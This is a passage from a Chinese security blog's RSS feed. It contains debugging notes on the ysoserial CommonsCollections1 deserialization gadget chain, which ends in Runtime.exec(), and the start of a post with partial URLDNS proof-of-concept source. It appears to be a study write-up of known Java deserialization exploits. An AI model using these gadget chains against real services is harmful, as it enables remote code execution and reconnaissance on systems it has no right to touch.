class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Gadget chain:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		ObjectInputStream.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;			AnnotationInvocationHandler.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;				Map(Proxy).entrySet()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;					AnnotationInvocationHandler.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;						LazyMap.get()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;							ChainedTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								ConstantTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Class.getMethod()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.getRuntime()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.exec()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Requires:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		commons-collections&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先从 PayloadRunner38 行进入反序列化&lt;/p&gt;
&lt;p&gt;其中 serialized 是我们序列化后的 payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 ObjectInputStream#readObject&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;42.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 AnnotationInvocationHandler#readObject 处下断点，查看调用栈&lt;/p&gt;
&lt;p&gt;观察到在 ObjectInputStream 中通过反射调用了 AnnotationInvocationHandler#readObject&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;43.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 AnnotationInvocationHandler#readObject&lt;/p&gt;
&lt;p&gt;此处 memberValues 为我们传入的代理对象 proxyMap&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;45.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;调用其任意方法，就会进入 AnnotationInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;这里要进入函数一直点点点，其中会多次返回该行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;46.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;直到再次进入 AnnotationInvocationHandler#readObject，运行至 355 行进入函数，会跳转至 AnnotationInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;47.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看当前函数调用栈&lt;/p&gt;
&lt;p&gt;handler1 的 readObject -&amp;gt; 代理对象的 entrySet -&amp;gt; handler2 的 invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;48.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造 handler2 时，传入的 Map 对象就是我们构造好的 LazyMap&lt;/p&gt;
&lt;p&gt;此时只要有调用 LazyMap#get，就会执行 transform&lt;/p&gt;
&lt;p&gt;查看当前变量，this.memberValues 就是 LazyMap 对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;49.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;往下滑滑滑滑滑&lt;/p&gt;
&lt;p&gt;在 78 行找到 &lt;code&gt;this.memberValues.get(var4)&lt;/code&gt;  啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;调试进入 LazyMap#get，其中当获取的 key 不存在时，会进入 if 代码块调用我们构造好的 transform&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;51.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看变量，执行的 transform 就是我们构造好的，会通过反射获取函数执行命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;53.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看函数调用栈，和分析中相同&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;52.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;调到这里就完成触发啦:happy:&lt;/p&gt;
&lt;p&gt;⭐碰见了很多奇奇怪怪的问题，比如根本不会跳进 LazyMap#get 中 if 中的代码块，或者还没到这就已经弹窗了，或者细调时根本不会弹窗… 困扰了我很久😪&lt;/p&gt;
&lt;p&gt;但是正常运行是没有问题的，所以我取消了所有除此之外的断点，查看函数调用栈和变量都 OK 了&lt;/p&gt;
&lt;p&gt;所以感觉应该是 debug 在实现自身功能时有影响到正常代码的触发，这里说明一下啦&lt;/p&gt;
&lt;h1 id=&#34;哔哔哔口水总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#哔哔哔口水总结&#34;&gt;#&lt;/a&gt; 哔哔哔口水总结&lt;/h1&gt;
&lt;p&gt;看 p 神的文章，一点一点仔细看了一遍&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;54.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后脑袋瓜子就糊了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;55.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后就从 URLDNS 开始再看一遍&lt;/p&gt;
&lt;p&gt;然后发现哇塞&lt;/p&gt;
&lt;p&gt;URLDNS 真的好简单耶&lt;/p&gt;
&lt;p&gt;怎么会有人看不懂这么简单的原理呀不会把不会吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;57.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后看 cc1，把 payload 原理又看了一遍，什么 transform 也太简单了把，不就是这样吗，这有什么难度吗？？？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;58.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后看触发原理调试的时候就是这样了 (beiwei)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;由其是还碰见了调试上的问题&lt;/p&gt;
&lt;p&gt;左左右右调试了一两个星期把&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;60.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;一直想把整个过程简洁优雅的总结出来，所以不断地总结总结，画图记笔记…&lt;/p&gt;
&lt;p&gt;因为能简单的把问题解释清楚才能证明自己是真的理解了（不然就和第一遍看 p 大文章的情况一样了）&lt;/p&gt;
&lt;p&gt;然后调完了理解了总结了记笔记了，我又行了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;58.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这也太简单了吧&lt;/p&gt;
&lt;p&gt;不会吧不会吧会难道还有人看不懂 cc1 吗&lt;/p&gt;
&lt;p&gt;以上作死的行为只是想提醒自己，很多很难的知识点一定要自己动手去试，多总结，一定要写文章记录下来（年纪大了真的会忘的），细节不要放过，一点一点抠&lt;/p&gt;
&lt;p&gt;我真的不是小天才，我只是个小神仙罢了，唉&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;61.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;下图是在理解触发原理时自己写的一个大概的流程（尽量简洁但是不是很简洁）&lt;/p&gt;
&lt;p&gt;看不看得懂就看缘分了😴&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;60.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</guid>
            <title>ysoserial之URLDNS调试</title>
            <link>http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</link>
            <category>ysoserial调试</category>
            <pubDate>Wed, 25 Aug 2021 11:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;利用链简述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用链简述&#34;&gt;#&lt;/a&gt; 利用链简述&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;触发结果为一次 DNS 请求，适用目标无回显情况&lt;/li&gt;
&lt;li&gt;使用 java 内置类构造，无第三方库依赖&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;urldns利用代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#urldns利用代码&#34;&gt;#&lt;/a&gt; URLDNS 利用代码&lt;/h1&gt;
&lt;p&gt;poc：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;package&lt;/span&gt; ysoserial.payloads;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.InetAddress;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URLConnection;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URLStreamHandler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.util.HashMap;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.Authors;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.Dependencies;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.PayloadTest;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.PayloadRunner;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.Reflections;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * A blog post with more details about this gadget chain is at the url below:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   This was inspired by  Philippe Arteau &lt;span class=&#34;doctag&#34;&gt;@h&lt;/span&gt;3xstream, who wrote a blog&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   posting describing how he modified the Java Commons Collections gadget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   in ysoserial to open a URL. This takes the same idea, but eliminates&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   the dependency on Commons Collections and does a DNS lookup with just&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   standard JDK classes.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   The Java URL class has an interesting property on its equals and&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   hashCode methods. The URL class will, as a side effect, do a DNS lookup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   during a comparison (either equals or hashCode).&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   As part of deserialization, HashMap calls hashCode on each key that it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   deserializes, so using a Java URL object as a serialized key allows&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   it to trigger a DNS lookup.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   Gadget Chain:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *     HashMap.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *       HashMap.putVal()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *         HashMap.hash()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *           URL.hashCode()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@SuppressWarnings(&amp;#123; &amp;quot;rawtypes&amp;quot;, &amp;quot;unchecked&amp;quot; &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@PayloadTest(skip = &amp;quot;true&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Dependencies()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Authors(&amp;#123; Authors.GEBL &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;URLDNS&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ObjectPayload&lt;/span&gt;&amp;lt;&lt;span class=&#34;title&#34;&gt;Object&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String url)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//Avoid DNS resolution during payload creation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                URLStreamHandler handler = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; SilentURLStreamHandler();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                HashMap ht = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap(); &lt;span class=&#34;comment&#34;&gt;// HashMap that will contain the URL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                URL u = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; URL(&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, url, handler); &lt;span class=&#34;comment&#34;&gt;// URL to use as the Key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ht.put(u, url); &lt;span class=&#34;comment&#34;&gt;//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 